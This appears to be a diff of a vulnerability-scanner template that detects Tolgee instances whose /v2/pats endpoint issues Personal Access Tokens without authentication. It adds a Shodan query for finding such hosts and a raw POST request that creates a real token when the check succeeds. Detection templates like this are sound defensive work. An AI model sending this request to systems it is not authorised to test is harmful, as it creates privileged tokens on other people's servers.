@@ -5,32 +5,40 @@ info:
   author: matejsmycka
   severity: medium
   description: |
-    Tolgee API without authentication allows creating Personal Access Tokens (PATs) via the `/v2/pats` endpoint.
-    This token can be then used to access the API with elevated privileges.
+    The Tolgee API exposes the `/v2/pats` endpoint without requiring authentication, allowing attackers to create Personal Access Tokens (PATs). These tokens can then be leveraged to interact with the API and gain elevated privileges.
   reference:
     - https://docs.tolgee.io/api
   metadata:
     max-request: 1
-  tags: misconfiguration,api,tolgee
+    verified: true
+    shodan-query: html:"tolgee"
+  tags: api,tolgee,misconfig
+
+variables:
+  string: "{{to_lower('{{randstr}}')}}"
 
 http:
-  - method: POST
-    path:
-      - "{{BaseURL}}/v2/pats"
-    body: '{"description":"test token"}'
+  - raw:
+      - |
+        POST /v2/pats HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: gzip
+
+        {"description":"{{string}}"}
 
     matchers-condition: and
     matchers:
       - type: word
+        part: body
         words:
-          - token
+          - '{"token":'
+          - '"createdAt"'
         condition: and
 
       - type: word
-        part: header
+        part: content_type
         words:
           - application/hal+json
-        condition: or
 
       - type: status
         status:
